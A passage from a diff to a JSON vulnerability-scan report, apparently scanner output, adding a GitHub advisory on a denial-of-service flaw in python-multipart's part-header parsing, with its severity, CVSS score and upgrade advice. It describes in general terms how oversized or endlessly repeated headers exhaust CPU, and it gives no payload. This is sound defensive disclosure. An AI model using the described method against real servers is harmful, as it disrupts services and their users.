+          "Description": "### Summary\n\n`python-multipart` has a denial of service vulnerability in multipart part header parsing. When parsing `multipart/form-data`, `MultipartParser` previously had no limit on the number of part headers or the size of an individual part header. An attacker could send a request with either many repeated headers without terminating the header block or a single very large header value, causing excessive CPU work before request rejection or completion.\n\n### Impact\n\nApplications that parse attacker-controlled `multipart/form-data` with affected versions of `python-multipart` can experience CPU exhaustion. ASGI applications using Starlette, FastAPI, or other frameworks that invoke `python-multipart` may have worker or event-loop delays while processing malicious upload requests.\n\n### Details\n\nThe affected parser states are `HEADER_FIELD_START`, `HEADER_FIELD`, `HEADER_VALUE_START`, `HEADER_VALUE`, and `HEADER_VALUE_ALMOST_DONE`. The issue can be triggered by:\n\n- A multipart part with an oversized individual header value.\n- A multipart part with many repeated header lines or an unterminated header block.\n\nBoth variants are addressed by enforcing default parser limits for maximum header count and maximum header size.\n\n### Mitigation\n\nUpgrade to `python-multipart` `0.0.27` or later.\n\nIf upgrading is not immediately possible, reduce exposure by enforcing request body size limits at the server, proxy, or framework layer. This is only a mitigation; affected versions of `python-multipart` still parse multipart part headers without the default header count and header size limits.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/Kludex/python-multipart",
+            "https://github.com/Kludex/python-multipart/security/advisories/GHSA-pp6c-gr5w-3c5g"
+          ]
         }
       ]
     }
